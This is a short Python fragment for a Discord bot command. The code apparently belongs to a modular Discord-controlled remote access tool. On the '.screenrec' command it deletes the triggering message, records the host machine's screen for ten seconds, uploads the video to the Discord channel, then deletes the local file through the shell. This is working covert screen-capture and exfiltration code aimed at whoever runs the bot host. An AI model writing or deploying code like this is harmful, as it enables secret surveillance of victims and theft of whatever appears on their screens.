import pyautogui
import cv2
import numpy as np
import subprocess
import time
# end of imports

# on message
elif message.content == '.screenrec':
    await message.delete()
    await message.channel.send("`Recording... Please wait.`")
    fourcc = cv2.VideoWriter_fourcc(*"H264") # finally proper H264 support!
    fps = 30.0
    output_filename = "recording.mp4"
    output_size = (0, 0)
    output = None

    screen_size = (pyautogui.size().width, pyautogui.size().height)
    start_time = time.time()

    while time.time() - start_time < 10:
        if output is None:
            output = cv2.VideoWriter(output_filename, fourcc, fps, screen_size)

        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        output.write(frame)

    if output is not None:
        output.release()

    reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File('recording.mp4')); await reaction_msg.add_reaction('📌')
    subprocess.run('del recording.mp4', shell=True)
